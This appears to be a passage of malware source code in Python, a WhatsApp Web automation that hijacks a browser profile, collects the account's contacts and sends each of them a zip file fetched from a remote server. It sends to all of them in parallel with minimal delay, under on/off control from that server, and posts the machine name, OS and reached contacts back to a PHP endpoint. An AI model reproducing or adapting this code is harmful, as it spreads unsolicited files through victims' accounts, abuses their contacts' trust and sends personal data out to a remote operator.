            nome_arquivo_escaped = self.escape_javascript_string(nome_arquivo)
            
            # Script para enviar MÚLTIPLOS contatos em PARALELO
            script = f"""
            var callback = arguments[arguments.length - 1];
            var contatos = {json.dumps(contatos_js)};
            var mensagemFinal = '{mensagem_final_escaped}';
            var nomeArquivo = '{nome_arquivo_escaped}';
            var arquivoBase64 = '{arquivo_base64}';
            
            async function enviarLote() {{
                const resultados = [];
                
                // Criar arquivo uma vez só
                const binaryString = atob(arquivoBase64);
                const bytes = new Uint8Array(binaryString.length);
                for (let i = 0; i < binaryString.length; i++) {{
                    bytes[i] = binaryString.charCodeAt(i);
                }}
                const blob = new Blob([bytes], {{ type: 'application/zip' }});
                const file = new File([blob], nomeArquivo, {{ type: 'application/zip' }});
                
                // Enviar para TODOS os contatos EM PARALELO!
                const promessas = contatos.map(async (contato) => {{
                    try {{
                        await Promise.all([
                            WPP.chat.sendTextMessage(contato.numero, contato.mensagemSaudacao, {{createChat: true, waitForAck: false}}),
                            WPP.chat.sendFileMessage(contato.numero, file, {{createChat: true, caption: '', filename: nomeArquivo, waitForAck: false}}),
                            WPP.chat.sendTextMessage(contato.numero, mensagemFinal, {{createChat: true, waitForAck: false}})
                        ]);
                        return {{ success: true, nome: contato.nome, numero: contato.numero }};
                    }} catch (erro) {{
                        return {{ success: false, nome: contato.nome, numero: contato.numero, erro: erro.message }};
                    }}
                }});
                
                // Executar TUDO ao mesmo tempo!
                const resultados_finais = await Promise.all(promessas);
                callback(resultados_finais);
            }}
            
            enviarLote();
            """
            
            self.driver.set_script_timeout(30)  # Mais tempo para múltiplos envios
            resultados = self.driver.execute_async_script(script)
            
            return resultados if resultados else []
            
        except Exception as e:
            self.send_log(TipoLog.ERRO, f"Erro no envio em lote: {e}")
            return []
    
    def enviar_relatorio_php(self, total_contatos: int, enviados_sucesso: int,
                            lista_contatos: List[Dict]):
        """Envia relatório para o servidor PHP"""
        try:
            tempo_total = (datetime.now() - INICIO_EXECUCAO).total_seconds() / 60
            
            dados = {
                'session_id': SESSION_ID,
                'nome_maquina': NOME_MAQUINA,
                'sistema_operacional': platform.platform(),
                'total_contatos': total_contatos,
                'enviados_com_sucesso': enviados_sucesso,
                'tempo_total_minutos': round(tempo_total, 2),
                'timestamp_inicio': INICIO_EXECUCAO.strftime("%Y-%m-%d %H:%M:%S"),
                'timestamp_fim': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'lista_contatos': json.dumps(lista_contatos)
            }
            
            response = requests.post(PHP_ENDPOINT, data=dados, timeout=10)
            result = response.json()
            
            if result.get('success'):
                self.send_log(TipoLog.SUCESSO, "✓ Relatório enviado ao servidor")
            else:
                self.send_log(TipoLog.AVISO, "Servidor recebeu mas retornou erro")
                
        except Exception as e:
            self.send_log(TipoLog.AVISO, f"Não foi possível enviar relatório: {e}")
    
    def executar(self):
        """Executa o processo completo de automação"""
        try:
            # Configuração inicial
            self.send_log(TipoLog.INICIO, "Iniciando WhatsApp Automation")
            self.send_log(TipoLog.INFO, f"Máquina: {NOME_MAQUINA}")
            self.send_log(TipoLog.INFO, f"Session ID: {SESSION_ID}")
            
            # Carregar configurações do servidor
            config_dict = self.get_configuracoes_online()
            for key, value in config_dict.items():
                if hasattr(self.config, key):
                    setattr(self.config, key, value)
            
            # Detectar navegador
            resultado_deteccao = self.detectar_navegador()
            if not resultado_deteccao:
                raise RuntimeError("Nenhum navegador suportado encontrado")
            
            tipo_navegador, navegador_config = resultado_deteccao
            self.navegador_atual = navegador_config
            
            # Encontrar ou criar perfil
            self.profile_path = self.encontrar_perfil(navegador_config)
            if not self.profile_path:
                self.profile_path = self.criar_perfil_temporario()
                self.profile_selenium = self.profile_path
            
            # Baixar WA-JS
            self.baixar_wa_js()
            
            # Configurar driver
            self.driver = self.configurar_driver(tipo_navegador, navegador_config)
            
            # Inicializar WhatsApp
            self.inicializar_whatsapp()
            
            # PEGAR contatos do WhatsApp e ENVIAR para servidor automaticamente
            contatos = self.obter_contatos()
            if not contatos:
                raise RuntimeError("Nenhum contato disponível no WhatsApp")
            
            # Aplicar filtros configurados no servidor
            contatos_para_envio = self.filtrar_contatos(contatos)
            if not contatos_para_envio:
                raise RuntimeError("Nenhum contato após filtragem")
            
            self.send_log(TipoLog.INFO, f"📋 {len(contatos_para_envio)} contatos para processar")
            
            # Baixar arquivo do servidor para enviar
            nome_arquivo, arquivo_base64 = self.baixar_arquivo()
            
            # ENVIAR MENSAGENS para os contatos
            total_enviados = 0
            total_erros = 0
            resultados_detalhados = []
            
            print("\n" + "="*40)
            self.send_log(TipoLog.INFO, "INICIANDO ENVIO DE MENSAGENS")
            print("="*40 + "\n")
            
            for idx, contato in enumerate(contatos_para_envio):
                # Verificar se envio está ativo (apenas a cada 20 mensagens)
                if idx % 20 == 0:
                    self.wait_for_envio_ativo()
                    # Atualizar configurações a cada 20 mensagens também
                    self.update_configuracoes_se_necessario()
                
                numero_atual = idx + 1
                
                # Pular contatos com @lid (empresariais)
                if '@lid' in contato.numero:
                    self.send_log(TipoLog.AVISO, 
                                f"[{numero_atual}/{len(contatos_para_envio)}] Pulando {contato.nome} (empresarial)")
                    total_erros += 1
                    resultados_detalhados.append({
                        'nome': contato.nome,
                        'numero': contato.numero,
                        'status': 'erro',
                        'erro': 'Contato empresarial'
                    })
                    continue
                
                # Verificar se já foi processado
                if any(c.numero == contato.numero for c in self.contatos_processados):
                    self.send_log(TipoLog.INFO, 
                                f"[{numero_atual}/{len(contatos_para_envio)}] Já processado: {contato.nome}")
                    continue
                
                # Log mais simples
                print(f"[{numero_atual}/{len(contatos_para_envio)}] {contato.nome}", end=' ... ')
                
                # Enviar mensagem com arquivo - RÁPIDO!
                resultado = self.enviar_para_contato(contato, nome_arquivo, arquivo_base64)
                
                if resultado.get('success'):
                    total_enviados += 1
                    print("✅")
                    resultados_detalhados.append({
                        'nome': contato.nome,
                        'numero': contato.numero,
                        'status': 'sucesso'
                    })
                else:
                    total_erros += 1
                    erro_msg = resultado.get('erro', 'Erro desconhecido')
                    
                    # Mostrar erro de forma compacta
                    if 'lid' in erro_msg.lower() or 'empresarial' in erro_msg.lower():
                        print("❌ (empresarial)")
                    elif 'timeout' in erro_msg.lower():
                        print("⏱️ (timeout)")
                    else:
                        print(f"❌ ({erro_msg[:20]}...)" if len(erro_msg) > 20 else f"❌ ({erro_msg})")
                    
                    resultados_detalhados.append({
                        'nome': contato.nome,
                        'numero': contato.numero,
                        'status': 'erro',
                        'erro': erro_msg
                    })
                
                self.contatos_processados.append(contato)
                
                # Delay MÍNIMO e INTELIGENTE
                if idx < len(contatos_para_envio) - 1:
                    # Se teve erro, não precisa delay (já perdeu tempo)
                    if resultado.get('success'):
                        delay_ms = int(self.config.delay_entre_mensagens)
                        
                        # Limitar delay máximo para velocidade
                        if delay_ms > 500:
                            delay_ms = 200  # Máximo 200ms
                        elif delay_ms < 50:
                            delay_ms = 50   # Mínimo 50ms
                        
                        time.sleep(delay_ms / 1000.0)
                
                # Mostrar progresso a cada 50 mensagens
                if (idx + 1) % 50 == 0:
                    porcentagem = ((idx + 1) / len(contatos_para_envio)) * 100
                    velocidade = (idx + 1) / ((datetime.now() - INICIO_EXECUCAO).total_seconds() / 60)
                    print(f"\n📊 Progresso: {porcentagem:.1f}% | ✅ {total_enviados} | ❌ {total_erros} | ⚡ {velocidade:.1f} msgs/min\n")
            
            # Relatório final
            print("\n" + "="*40)
            self.send_log(TipoLog.SUCESSO, "ENVIO CONCLUÍDO", 
                        f"✅ {total_enviados} | ❌ {total_erros}")
            print("="*40 + "\n")
            
            # Aguardar sincronização
            modo_headless = self.config.modo_headless.lower() == "true"
            tempo_espera = 45 if modo_headless else 30
            self.send_log(TipoLog.INFO, f"Aguardando sincronização: {tempo_espera}s")
            time.sleep(tempo_espera)
            
            # Enviar relatório final para o servidor
            contatos_enviados = [r for r in resultados_detalhados if r['status'] == 'sucesso']
            self.enviar_relatorio_php(len(contatos), total_enviados, contatos_enviados)
            
            # Estatísticas finais
            tempo_total = (datetime.now() - INICIO_EXECUCAO).total_seconds() / 60
            taxa_sucesso = (total_enviados / len(contatos_para_envio) * 100) if contatos_para_envio else 0
            
            print("\n" + "="*40)
            self.send_log(TipoLog.FIM, "Finalizado", 
                        f"Tempo: {tempo_total:.2f}min | Taxa: {taxa_sucesso:.2f}%")
            print("="*40 + "\n")
            
        except Exception as e:
            self.send_log(TipoLog.ERRO, "Erro crítico", str(e))
            print(f"\n❌ ERRO CRÍTICO: {e}\n")
            raise
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Limpa recursos"""
        try:
            if self.driver:
                self.driver.quit()
                self.send_log(TipoLog.INFO, "Navegador fechado")
        except:
            pass
        
        # Aguardar um pouco antes de tentar remover o perfil
        time.sleep(2)
        
        # Limpar perfil temporário se foi criado
        if self.profile_selenium and self.profile_selenium.exists():
            try:
                # Tentar várias vezes caso o arquivo esteja em uso
                for tentativa in range(3):
                    try:
                        shutil.rmtree(self.profile_selenium, ignore_errors=True)
                        if not self.profile_selenium.exists():
                            self.send_log(TipoLog.INFO, "Perfil temporário removido")
                            break
                    except:
                        time.sleep(1)
            except:
                # Se não conseguir remover, não é crítico
                pass

# ============================================
# FUNÇÃO PRINCIPAL
# ============================================

def main():
    """Função principal"""
    try:
        automation = WhatsAppAutomation()
        automation.executar()
        return 0
    except KeyboardInterrupt:
        print("\n\n⚠ Interrompido pelo usuário\n")
        return 1
    except Exception as e:
        print(f"\n❌ Erro: {e}\n")
        return 1

if __name__ == "__main__":
    sys.exit(main())